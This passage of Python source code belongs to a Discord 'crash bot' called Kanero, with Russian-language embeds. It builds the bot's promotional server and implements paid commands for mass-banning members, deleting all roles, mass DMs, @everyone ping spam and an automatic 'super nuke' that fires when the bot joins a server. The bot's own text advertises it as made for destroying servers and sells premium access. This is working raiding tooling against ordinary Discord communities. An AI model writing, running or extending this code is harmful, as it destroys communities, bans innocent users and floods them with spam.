        mute_members=True,
        deafen_members=True,
        priority_speaker=True
    )
    # 🔧 Developer — полный администратор
    dev_perms = discord.Permissions(administrator=True)

    role_guest   = await guild.create_role(name="👤 Guest",     color=discord.Color.from_rgb(150, 150, 150), permissions=guest_perms,   hoist=False, mentionable=False)
    role_white   = await guild.create_role(name="✅ White",     color=discord.Color.from_rgb(85, 170, 255),  permissions=white_perms,   hoist=True,  mentionable=False)
    role_premium = await guild.create_role(name="💎 Premium",   color=discord.Color.from_rgb(180, 80, 255),  permissions=premium_perms, hoist=True,  mentionable=False)
    role_owner   = await guild.create_role(name="👑 Owner",     color=discord.Color.from_rgb(255, 200, 0),   permissions=owner_perms,   hoist=True,  mentionable=False)
    role_dev     = await guild.create_role(name="🔧 Developer", color=discord.Color.from_rgb(255, 60, 60),   permissions=dev_perms,     hoist=True,  mentionable=False)
    role_bot     = await guild.create_role(name="🤖 Kanero",    color=discord.Color.from_rgb(0, 200, 150),   permissions=dev_perms,     hoist=True,  mentionable=False)

    # Выдаём роль боту
    try:
        await guild.me.add_roles(role_bot)
    except Exception:
        pass

    # ── 3. Настраиваем права по умолчанию — @everyone ничего не видит ──
    await guild.default_role.edit(permissions=discord.Permissions(
        read_messages=False,
        send_messages=False,
        connect=False
    ))

    # Базовые overwrites для публичных каналов (видят все кроме @everyone)
    def pub_ow():
        return {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
            role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        }

    # Только для White+
    def wl_ow():
        return {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            role_guest: discord.PermissionOverwrite(read_messages=False),
            role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        }

    # Только для Owner+
    def admin_ow():
        return {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            role_guest: discord.PermissionOverwrite(read_messages=False),
            role_white: discord.PermissionOverwrite(read_messages=False),
            role_premium: discord.PermissionOverwrite(read_messages=False),
            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        }

    # ── 4. Создаём категории и каналы ──

    # ━━ 📢 ОСНОВНОЕ ━━
    cat_main = await guild.create_category("━━━━ 📢 ОСНОВНОЕ ━━━━", overwrites={
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        role_guest: discord.PermissionOverwrite(read_messages=True),
        role_white: discord.PermissionOverwrite(read_messages=True),
        role_premium: discord.PermissionOverwrite(read_messages=True),
        role_owner: discord.PermissionOverwrite(read_messages=True),
        role_dev: discord.PermissionOverwrite(read_messages=True),
    })

    # Права для каналов только-чтение (новости, анонсы, changelog, конкурсы)
    def readonly_ow():
        return {
            guild.default_role: discord.PermissionOverwrite(read_messages=False, send_messages=False),
            role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
            role_white: discord.PermissionOverwrite(read_messages=True, send_messages=False),
            role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=False),
            role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        }

    info_ch   = await guild.create_text_channel("ℹ️・info",       category=cat_main, overwrites=pub_ow(),      topic="📌 Информация о боте Kanero — команды, уровни доступа, как начать пользоваться")
    rules_ch  = await guild.create_text_channel("📜・правила",    category=cat_main, overwrites=pub_ow(),      topic="📌 Правила сервера — прочти перед тем как начать общаться")
    await guild.create_text_channel("📰・новости",                category=cat_main, overwrites=readonly_ow(), topic="📌 Новости и обновления Kanero — только Owner может писать")
    await guild.create_text_channel("📋・changelog",              category=cat_main, overwrites=readonly_ow(), topic="📌 История обновлений бота — команда !changelogall для полной истории")
    await guild.create_text_channel("🏆・конкурсы",               category=cat_main, overwrites=readonly_ow(), topic="📌 Конкурсы и розыгрыши — следи за анонсами")
    await guild.create_text_channel("📣・анонсы",                 category=cat_main, overwrites=readonly_ow(), topic="📌 Важные объявления от администрации — только Owner может писать")
    addbot_ch = await guild.create_text_channel("🤖・addbot",     category=cat_main, overwrites={
        guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        role_white: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
    }, topic="📌 Напиши сюда любое сообщение — бот напишет тебе в ЛС с инструкцией по подключению")

    # ━━ 💬 ЧАТЫ ━━
    cat_chat = await guild.create_category("━━━━ 💬 ЧАТЫ ━━━━", overwrites={
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        role_guest: discord.PermissionOverwrite(read_messages=False),
        role_white: discord.PermissionOverwrite(read_messages=True),
        role_premium: discord.PermissionOverwrite(read_messages=True),
        role_owner: discord.PermissionOverwrite(read_messages=True),
        role_dev: discord.PermissionOverwrite(read_messages=True),
    })
    # Welcome — виден всем, писать только бот (Owner+)
    welcome_ch = await guild.create_text_channel("👋・welcome",      category=cat_chat, overwrites={
        guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=False),
        role_guest: discord.PermissionOverwrite(read_messages=True, send_messages=False),
        role_white: discord.PermissionOverwrite(read_messages=True, send_messages=False),
        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=False),
        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
    }, topic="📌 Приветствие новых участников — бот автоматически пишет сюда при входе нового участника")
    await guild.create_text_channel("💬・общий",        category=cat_chat, overwrites=wl_ow(), topic="📌 Общий чат — доступен для White+ участников, общайся на любые темы")
    await guild.create_text_channel("🎮・игры",         category=cat_chat, overwrites=wl_ow(), topic="📌 Обсуждение игр — делись клипами, ищи тиммейтов, обсуждай новинки")
    await guild.create_text_channel("💡・идеи",         category=cat_chat, overwrites=wl_ow(), topic="📌 Предложения и идеи для улучшения бота и сервера — пиши свои мысли")
    await guild.create_text_channel("🖼️・медиа",        category=cat_chat, overwrites=wl_ow(), topic="📌 Картинки, видео, мемы, скриншоты — делись контентом")
    await guild.create_text_channel("🎫・create-ticket",category=cat_chat, overwrites=wl_ow(), topic="📌 Создать тикет поддержки — напиши сюда если нужна помощь или есть вопрос")
    await guild.create_text_channel("🤝・партнёрство",  category=cat_chat, overwrites=wl_ow(), topic="📌 Предложения о партнёрстве — пиши если хочешь сотрудничать")

    # ━━ 💎 PREMIUM ━━
    cat_prem = await guild.create_category("━━━━ 💎 PREMIUM ━━━━", overwrites={
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        role_guest: discord.PermissionOverwrite(read_messages=False),
        role_white: discord.PermissionOverwrite(read_messages=False),
        role_premium: discord.PermissionOverwrite(read_messages=True),
        role_owner: discord.PermissionOverwrite(read_messages=True),
        role_dev: discord.PermissionOverwrite(read_messages=True),
    })
    prem_ow = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        role_guest: discord.PermissionOverwrite(read_messages=False),
        role_white: discord.PermissionOverwrite(read_messages=False),
        role_premium: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        role_owner: discord.PermissionOverwrite(read_messages=True, send_messages=True),
        role_dev: discord.PermissionOverwrite(read_messages=True, send_messages=True),
    }
    await guild.create_text_channel("💎・premium-chat",  category=cat_prem, overwrites=prem_ow, topic="📌 Чат для Premium пользователей — общение, вопросы, обсуждение функций")
    await guild.create_text_channel("🔑・premium-info",  category=cat_prem, overwrites=prem_ow, topic="📌 Информация о Premium подписке — что входит, как купить, как использовать")
    await guild.create_text_channel("🛠️・premium-tools", category=cat_prem, overwrites=prem_ow, topic="📌 Расширенные команды бота — !super_nuke, !massban, !massdm и другие Premium функции")
    await guild.create_text_channel("🎁・premium-gifts", category=cat_prem, overwrites=prem_ow, topic="📌 Подарки и бонусы для Premium участников — эксклюзивные раздачи")

    # ━━ 👑 ADMIN ━━
    cat_admin = await guild.create_category("━━━━ 👑 ADMIN ━━━━", overwrites={
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        role_guest: discord.PermissionOverwrite(read_messages=False),
        role_white: discord.PermissionOverwrite(read_messages=False),
        role_premium: discord.PermissionOverwrite(read_messages=False),
        role_owner: discord.PermissionOverwrite(read_messages=True),
        role_dev: discord.PermissionOverwrite(read_messages=True),
    })
    await guild.create_text_channel("👑・admin-chat",    category=cat_admin, overwrites=admin_ow(), topic="📌 Чат администрации — только Owner+ видит и пишет")
    await guild.create_text_channel("📊・logs",          category=cat_admin, overwrites=admin_ow(), topic="📌 Логи действий бота — нюки, входы, выходы, изменения списков")
    await guild.create_text_channel("⚙️・bot-commands",  category=cat_admin, overwrites=admin_ow(), topic="📌 Команды управления ботом — !wl_add, !pm_add, !setup, !auto_off и другие Owner команды")
    await guild.create_text_channel("🔒・security",      category=cat_admin, overwrites=admin_ow(), topic="📌 Безопасность и блокировки — !block_guild, !blocked_guilds, управление доступом")
    await guild.create_text_channel("📋・whitelist",     category=cat_admin, overwrites=admin_ow(), topic="📌 Управление whitelist — список пользователей с доступом к боту")

    # ━━ 🔊 ВОЙСЫ ━━
    cat_voice = await guild.create_category("━━━━ 🔊 ВОЙСЫ ━━━━", overwrites={
        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_guest: discord.PermissionOverwrite(connect=False, view_channel=True),
        role_white: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_premium: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
    })
    for i in range(1, 4):
        await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice, user_limit=10)
    await guild.create_voice_channel("🎮 gaming-voice", category=cat_voice, user_limit=8)
    await guild.create_voice_channel("💎 premium-voice", category=cat_voice, user_limit=20, overwrites={
        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_guest: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_white: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_premium: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
    })
    await guild.create_voice_channel("👑 admin-voice", category=cat_voice, overwrites={
        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_guest: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_white: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_premium: discord.PermissionOverwrite(connect=False, view_channel=False),
        role_owner: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
        role_dev: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
    })

    # ── 5. Отправляем контент в каналы ──

    # Правила
    rules_embed = discord.Embed(
        title="📜 Правила сервера — Kanero",
        description=(
            "Добро пожаловать на официальный сервер **☠️ Kanero**!\n\n"
            "Прочти правила перед тем как начать общаться. Незнание правил не освобождает от ответственности.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        ),
        color=0x0a0a0a
    )
    rules_embed.add_field(
        name="📋 Основные правила",
        value=(
            "**1.** Уважай всех участников сервера\n"
            "**2.** Запрещён спам, флуд, капслок\n"
            "**3.** Не рекламируй сторонние ресурсы без разрешения администрации\n"
            "**4.** Не делись личными данными других людей (доксинг)\n"
            "**5.** Строго соблюдай правила Discord ToS\n"
            "**6.** Не злоупотребляй командами бота на этом сервере\n"
            "**7.** Запрещён токсик, оскорбления, дискриминация любого рода\n"
            "**8.** Запрещены NSFW материалы вне специальных каналов\n"
            "**9.** Не выдавай себя за администрацию или других участников"
        ),
        inline=False
    )
    rules_embed.add_field(
        name="🎭 Уровни доступа",
        value=(
            "🤖 **Kanero** — сам бот, высший приоритет\n"
            "🔧 **Developer** — разработчик, полный доступ (administrator)\n"
            "👑 **Owner** — управление сервером без полного admin\n"
            "💎 **Premium** — расширенные команды + premium каналы\n"
            "✅ **White** — базовые команды бота + все чаты\n"
            "👤 **Guest** — только чтение публичных каналов"
        ),
        inline=False
    )
    rules_embed.add_field(
        name="🔑 Как получить доступ",
        value=(
            "**White (бесплатно):** напиши в 🤖・addbot — бот напишет в ЛС\n"
            "**Premium (платно):** напиши **davaidkatt** или **@Firisotik**\n\n"
            "⚠️ При выходе с сервера доступ удаляется автоматически"
        ),
        inline=False
    )
    rules_embed.add_field(
        name="⚖️ Наказания",
        value=(
            "• Предупреждение → Мут → Кик → Бан\n"
            "• За грубые нарушения — бан без предупреждения\n"
            "• Решение администрации окончательное"
        ),
        inline=False
    )
    rules_embed.set_footer(text="☠️ Kanero  |  Нарушение правил = бан  |  davaidkatt")
    await rules_ch.send(embed=rules_embed)

    # Инфо
    info_embed = discord.Embed(
        title="☠️ Kanero — Официальная информация",
        description=(
            "**Kanero** — мощный краш-бот для Discord.\n"
            "Создан для уничтожения серверов: нюк, бан, спам, авто-краш при входе.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        ),
        color=0x0a0a0a
    )
    info_embed.add_field(
        name="🌍 Доступно ВСЕМ (без регистрации)",
        value=(
            "`!nuke` — краш сервера\n"
            "• Переименование всех каналов → удаление ролей\n"
            "• Создание каналов со спамом → роль ☠️ Kanero\n\n"
            "`!auto_nuke on/off/info` — авто-краш при входе бота на сервер\n"
            "`!help` — список команд по твоему уровню доступа\n"
            "`!changelog` — последнее обновление\n"
            "`!changelogall` — вся история обновлений"
        ),
        inline=False
    )
    info_embed.add_field(
        name="✅ White (напиши в 🤖・addbot)",
        value=(
            "`!nuke [текст]` — нюк со своим текстом спама\n"
            "`!stop` — остановить запущенный краш\n"
            "`!cleanup` — снести всё, оставить один канал\n"
            "`!rename <название>` — переименовать все каналы\n"
            "`!nicks_all <ник>` — сменить ники всем участникам\n"
            "`!webhooks` — показать все вебхуки сервера\n"
            "`!clear [число]` — удалить N сообщений (макс 100)\n"
            "`/sp <кол-во> <текст>` — спам сообщениями\n"
            "`/spkd <задержка> <кол-во> <текст>` — спам с задержкой"
        ),
        inline=False
    )
    info_embed.add_field(
        name="💎 Premium (платно — davaidkatt)",
        value=(
            "`!super_nuke [текст]` — нюк + бан до 15 участников + роль ☠️\n"
            "`!massban` — забанить всех участников сервера\n"
            "`!massdm <текст>` — разослать ДМ всем участникам\n"
            "`!spam <кол-во> <текст>` — спам в текущий канал\n"
            "`!pingspam [кол-во]` — спам @everyone\n"
            "`!rolesdelete` — удалить все роли сервера\n"
            "`!serverinfo` — подробная информация о сервере\n"
            "`!userinfo [id]` — информация о пользователе\n"
            "`!auto_super_nuke on/off/text/info` — авто super_nuke при входе\n"
            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
        ),
        inline=False
    )
    info_embed.add_field(
        name="👑 Owner (только davaidkatt)",
        value=(
            "`!owner_nuke [текст]` — полный нюк, бан ВСЕХ участников\n"
            "`!auto_owner_nuke on/off/text/info` — авто owner нюк при входе\n"
            "`!setup` — пересоздать структуру сервера\n"
            "`!wl_add/remove/list` — управление whitelist\n"
            "`!pm_add/remove` — управление Premium\n"
            "`!auto_off` — выключить все авто нюки\n"
            "`!auto_info` — статус всех авто нюков\n"
            "`!nukelogs` — логи нюков с инвайтами"
        ),
        inline=False
    )
    info_embed.add_field(
        name="📌 Важно",
        value=(
            "• Реклама `☠️ Kanero` добавляется к тексту нюка **всегда**\n"
            "• При выходе с сервера — доступ удаляется автоматически\n"
            "• Whitelist выдаётся только вручную овнером\n\n"
            "**🔗 Сервер:** https://discord.gg/JEspTXRW\n"
            "**💬 Купить Premium:** **davaidkatt** | **@Firisotik**"
        ),
        inline=False
    )
    info_embed.set_footer(text="☠️ Kanero  |  v1.8  |  davaidkatt")
    info_embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
    await info_ch.send(embed=info_embed)

    # Addbot
    addbot_embed = discord.Embed(
        title="🤖 Как получить доступ к Kanero",
        description=(
            "Напиши **любое сообщение** в этот канал.\n"
            "Бот автоматически напишет тебе в ЛС с инструкцией.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        ),
        color=0x0a0a0a
    )
    addbot_embed.add_field(
        name="✅ Что ты получишь (White — бесплатно)",
        value=(
            "• `!nuke [текст]` — нюк со своим текстом спама\n"
            "• `!stop` — остановить запущенный краш\n"
            "• `!cleanup` — снести всё, оставить один канал\n"
            "• `!rename <название>` — переименовать все каналы\n"
            "• `!nicks_all <ник>` — сменить ники всем\n"
            "• `!webhooks` — список вебхуков\n"
            "• `!clear [число]` — удалить сообщения\n"
            "• `/sp` · `/spkd` — спам команды"
        ),
        inline=False
    )
    addbot_embed.add_field(
        name="💎 Premium (расширенный доступ)",
        value=(
            "• `!super_nuke` — нюк + бан до 15 участников\n"
            "• `!massban` · `!massdm` · `!spam` · `!pingspam`\n"
            "• `!rolesdelete` · `!serverinfo` · `!userinfo`\n"
            "• `!auto_super_nuke` · `!auto_superpr_nuke`\n\n"
            "**Купить:** напиши **davaidkatt** | **@Firisotik**"
        ),
        inline=False
    )
    addbot_embed.add_field(
        name="📌 Важно",
        value=(
            "• Whitelist выдаётся только вручную овнером\n"
            "• При выходе с сервера доступ удаляется\n"
            "• **Наш сервер:** https://discord.gg/JEspTXRW"
        ),
        inline=False
    )
    addbot_embed.set_footer(text="☠️ Kanero  |  Просто напиши что-нибудь в этот канал")
    await addbot_ch.send(embed=addbot_embed)

    # Welcome — приветственное сообщение в канале
    welcome_embed = discord.Embed(
        title="👋 Добро пожаловать на сервер Kanero!",
        description=(
            "Этот канал создан для приветствия новых участников.\n"
            "Бот автоматически пишет сюда когда кто-то заходит на сервер.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**Как начать пользоваться ботом:**\n"
            "1. Зайди в 🤖・addbot и напиши любое сообщение\n"
            "2. Бот напишет тебе в ЛС\n"
            "3. Добавь бота на свой сервер и используй команды\n\n"
            "**Купить Premium:** **davaidkatt** | **@Firisotik**\n"
            "**Сервер:** https://discord.gg/JEspTXRW"
        ),
        color=0x0a0a0a
    )
    welcome_embed.set_footer(text="☠️ Kanero  |  Приветствуем новых участников!")
    await welcome_ch.send(embed=welcome_embed)

    embed = discord.Embed(
        title="✅ Kanero — Сервер полностью настроен",
        description=(
            "**Роли созданы:**\n"
            "🤖 Kanero — роль бота (administrator)\n"
            "🔧 Developer — разработчик (administrator)\n"
            "👑 Owner — управление сервером (без admin)\n"
            "💎 Premium — расширенный доступ + premium каналы\n"
            "✅ White — базовый доступ + все чаты\n"
            "👤 Guest — только чтение публичных каналов\n"
            "@everyone — ничего не видит\n\n"
            "**Каналы созданы:**\n"
            "📢 ОСНОВНОЕ: info · правила · новости · changelog · конкурсы · анонсы · addbot\n"
            "💬 ЧАТЫ: welcome · общий · игры · идеи · медиа · create-ticket · партнёрство\n"
            "💎 PREMIUM: premium-chat · premium-info · premium-tools · premium-gifts\n"
            "👑 ADMIN: admin-chat · logs · bot-commands · security · whitelist\n"
            "🔊 ВОЙСЫ: voice-1/2/3 · gaming-voice · premium-voice · admin-voice\n\n"
            "**Права каналов:**\n"
            "• новости/анонсы/changelog/конкурсы — только Owner+ может писать\n"
            "• welcome — только бот пишет (авто при входе участника)\n"
            "• addbot — доступен всем\n"
            "• чаты — только White+\n"
            "• premium — только Premium+\n"
            "• admin — только Owner+\n\n"
            f"**Авто-роль при входе:** <@&{AUTO_ROLE_ID}>\n\n"
            "Контент отправлен в info, правила, addbot и welcome.\n"
            "Выдай роли участникам вручную через `!giverole`."
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  !giverole @юзер @роль — выдать роль")
    await msg.edit(content=None, embed=embed)


@bot.command(name="on_add")
async def on_add(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id not in OWNER_NUKE_LIST:
        OWNER_NUKE_LIST.append(user_id)
        save_owner_nuke_list()
    await ctx.send(f"👑 `{user_id}` получил доступ к **Owner Nuke**.")


@bot.command(name="on_remove")
async def on_remove(ctx, user_id: int):
    if ctx.author.id != config.OWNER_ID:
        return
    if user_id in OWNER_NUKE_LIST:
        OWNER_NUKE_LIST.remove(user_id)
        save_owner_nuke_list()
        await ctx.send(f"✅ `{user_id}` убран из Owner Nuke.")
    else:
        await ctx.send("Не найден.")


@bot.command(name="on_list")
async def on_list(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    lines = []
    for uid in OWNER_NUKE_LIST:
        try:
            user = await bot.fetch_user(uid)
            lines.append(f"`{uid}` — **{user}**")
        except Exception:
            lines.append(f"`{uid}` — *не найден*")
    embed = discord.Embed(title="👑 Owner Nuke List", description="\n".join(lines) if lines else "*пусто*", color=0x0a0a0a)
    embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(OWNER_NUKE_LIST)}")
    await ctx.send(embed=embed)


@bot.command(name="goout")
async def goout(ctx):
    """Бот покидает сервер где написана команда. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return
    guild = ctx.guild
    try:
        await ctx.send("👋 Выхожу с сервера.")
        await guild.leave()
    except Exception as e:
        await ctx.send(f"❌ Ошибка: {e}")


@bot.command(name="announce")
async def announce(ctx):
    """Отправить сообщение с кнопкой получения доступа. Только для овнера."""
    if ctx.author.id != config.OWNER_ID:
        return

    class GetAccessView(discord.ui.View):
        def __init__(self):
            super().__init__(timeout=None)
            app_id = ctx.bot.user.id
            url = f"https://discord.com/users/{app_id}"
            self.add_item(discord.ui.Button(
                label="💬 Написать боту в ЛС",
                url=url,
                style=discord.ButtonStyle.link
            ))

    embed = discord.Embed(
        title="☠️ Kanero — CRASH BOT",
        description=(
            "Добро пожаловать!\n\n"
            "**Что умеет бот:**\n"
            "• `!nuke` — краш любого сервера\n"
            "• `!auto_nuke` — авто-краш при входе\n"
            "• `!super_nuke` — нюк с баном участников\n"
            "• И многое другое...\n\n"
            "**Как получить доступ:**\n"
            "Нажми кнопку ниже → напиши боту в ЛС `!help`\n\n"
            "**Пока ты на этом сервере** — доступ к базовым командам активен.\n"
            "При выходе с сервера доступ удаляется автоматически.\n\n"
            "**Купить подписку:** **davaidkatt** | **@Firisotik**"
        ),
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero  |  Нажми кнопку чтобы начать")
    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")

    await ctx.send(embed=embed, view=GetAccessView())
    try:
        await ctx.message.delete()
    except Exception:
        pass




@bot.command(name="massdm")
@premium_check()
async def massdm(ctx, *, text: str):
    guild = ctx.guild
    members = [m for m in guild.members if not m.bot]
    sent = 0
    failed = 0
    status_msg = await ctx.send(embed=discord.Embed(
        description=f"📨 Рассылаю ДМ {len(members)} участникам...",
        color=0x0a0a0a
    ))
    for member in members:
        try:
            await member.send(text)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.5)
    embed = discord.Embed(
        title="📨 Mass DM завершён",
        description=f"✅ Отправлено: **{sent}**\n❌ Не доставлено: **{failed}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await status_msg.edit(embed=embed)


@bot.command(name="massban")
@premium_check()
async def massban(ctx):
    guild = ctx.guild
    bot_role = guild.me.top_role
    targets = [
        m for m in guild.members
        if not m.bot and m.id != ctx.author.id and m.id != guild.owner_id
        and (not m.top_role or m.top_role < bot_role)
    ]
    status_msg = await ctx.send(embed=discord.Embed(
        description=f"💀 Баню {len(targets)} участников...",
        color=0x0a0a0a
    ))
    results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
    banned = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        title="💀 Mass Ban завершён",
        description=f"✅ Забанено: **{banned}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await status_msg.edit(embed=embed)


@bot.command(name="spam")
@premium_check()
async def spam_cmd(ctx, count: int, *, text: str):
    if count > 50:
        await ctx.send("Максимум 50.")
        return
    mentions = discord.AllowedMentions(everyone=True, roles=True, users=True)
    for _ in range(count):
        try:
            await ctx.send(text, allowed_mentions=mentions)
            await asyncio.sleep(0.5)
        except Exception:
            pass


@bot.command(name="pingspam")
@premium_check()
async def pingspam(ctx, count: int = 10):
    if count > 30:
        await ctx.send("Максимум 30.")
        return
    mentions = discord.AllowedMentions(everyone=True)
    for _ in range(count):
        try:
            await ctx.send("@everyone @here", allowed_mentions=mentions)
            await asyncio.sleep(0.5)
        except Exception:
            pass


@bot.command(name="rolesdelete")
@premium_check()
async def rolesdelete(ctx):
    guild = ctx.guild
    bot_role = guild.me.top_role
    results = await asyncio.gather(
        *[r.delete() for r in guild.roles if r < bot_role and not r.is_default()],
        return_exceptions=True
    )
    deleted = sum(1 for r in results if not isinstance(r, Exception))
    embed = discord.Embed(
        description=f"🗑️ Удалено ролей: **{deleted}**",
        color=0x0a0a0a
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="serverinfo")
@premium_check()
async def serverinfo(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"☠️ {guild.name}",
        color=0x0a0a0a
    )
    embed.add_field(name="👥 Участников", value=str(guild.member_count))
    embed.add_field(name="📢 Каналов", value=str(len(guild.channels)))
    embed.add_field(name="🎭 Ролей", value=str(len(guild.roles)))
    embed.add_field(name="💎 Буст уровень", value=str(guild.premium_tier))
    embed.add_field(name="🚀 Бустеров", value=str(guild.premium_subscription_count))
    embed.add_field(name="🆔 ID сервера", value=str(guild.id))
    embed.add_field(name="👑 Овнер", value=str(guild.owner))
    embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
    if guild.icon:
        embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


@bot.command(name="userinfo")
@premium_check()
async def userinfo(ctx, user_id: int = None):
    if user_id:
        try:
            user = await bot.fetch_user(user_id)
        except Exception:
            await ctx.send("Пользователь не найден.")
            return
    else:
        user = ctx.author
    member = ctx.guild.get_member(user.id) if ctx.guild else None
    embed = discord.Embed(
        title=f"👁️ {user}",
        color=0x0a0a0a
    )
    embed.add_field(name="🆔 ID", value=str(user.id))
    embed.add_field(name="📅 Аккаунт создан", value=user.created_at.strftime("%d.%m.%Y"))
    if member:
        embed.add_field(name="📥 Зашёл на сервер", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
        embed.add_field(name="🎭 Высшая роль", value=member.top_role.mention)
        embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
    if user.avatar:
        embed.set_thumbnail(url=user.avatar.url)
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── AUTO SUPER NUKE ───────────────────────────────────────

AUTO_SUPER_NUKE = False
AUTO_SUPER_NUKE_TEXT = None  # None = использовать config.SPAM_TEXT
AUTO_SUPERPR_NUKE = False
AUTO_SUPERPR_NUKE_TEXT = None
# Настройки что делать при auto_super_nuke
SNUKE_CONFIG = {
    "massban": True,       # банить всех
    "boosters_only": False, # банить только бустеров
    "rolesdelete": True,   # удалить роли
    "pingspam": True,      # пинг спам
    "massdm": False,       # масс дм
}


def save_auto_super_nuke():
    asyncio.create_task(db_set("data", "auto_super_nuke", {
        "enabled": AUTO_SUPER_NUKE,
        "text": AUTO_SUPER_NUKE_TEXT,
        "config": SNUKE_CONFIG
    }))


def load_auto_super_nuke():
    pass  # заменено на async load в on_ready


@bot.command(name="auto_super_nuke")
@premium_check()
async def auto_super_nuke_cmd(ctx, state: str, *, text: str = None):
    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT
    if state.lower() == "on":
        AUTO_SUPER_NUKE = True
        save_auto_super_nuke()
        embed = discord.Embed(
            title="💀 Auto Super Nuke — ВКЛЮЧЁН",
            description=(
                "При входе бота на сервер автоматически:\n"
                "• Нюк с твоим текстом (или дефолтным)\n"
                "• Массбан всех участников\n"
                "• Удаление всех ролей\n"
                "• Пинг спам @everyone\n\n"
                f"Текст: `{AUTO_SUPER_NUKE_TEXT or 'дефолтный'}`\n"
                "Чтобы задать текст: `!auto_super_nuke text <твой текст>`"
            ),
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "off":
        AUTO_SUPER_NUKE = False
        save_auto_super_nuke()
        embed = discord.Embed(description="❌ **Auto Super Nuke** выключен.", color=0x0a0a0a)
        embed.set_footer(text="☠️ Kanero")
        await ctx.send(embed=embed)
    elif state.lower() == "text":
        if not text:
            await ctx.send("Укажи текст: `!auto_super_nuke text <твой текст>`")
            return
        AUTO_SUPER_NUKE_TEXT = text
        save_auto_super_nuke()
        embed = discord.Embed(
            title="✅ Текст Auto Super Nuke обновлён",
            description=f"```{text[:500]}```",
            color=0x0a0a0a
        )
        embed.set_footer(text="☠️ Kanero  |  Теперь включи: !auto_super_nuke on")
        await ctx.send(embed=embed)
    elif state.lower() == "info":
        status = "✅ Включён" if AUTO_SUPER_NUKE else "❌ Выключен"
